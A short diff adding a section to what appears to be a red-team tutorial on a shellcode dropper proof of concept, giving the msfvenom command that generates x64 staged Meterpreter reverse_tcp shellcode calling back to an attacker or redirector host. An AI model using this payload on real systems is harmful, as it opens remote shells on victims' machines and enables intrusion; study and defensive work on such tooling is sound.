@@ -78,4 +78,11 @@ int main() {
 ```
 
 
+### Meterpreter Shellcode
+In this step, we will create our shellcode for the high-level API dropper poc with msfvenom in Kali Linux. To do this, we use the following command and 
+create x64 staged meterpreter shellcode.
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector or IPv4 Kali LPORT=80 -f c
+```
+
 
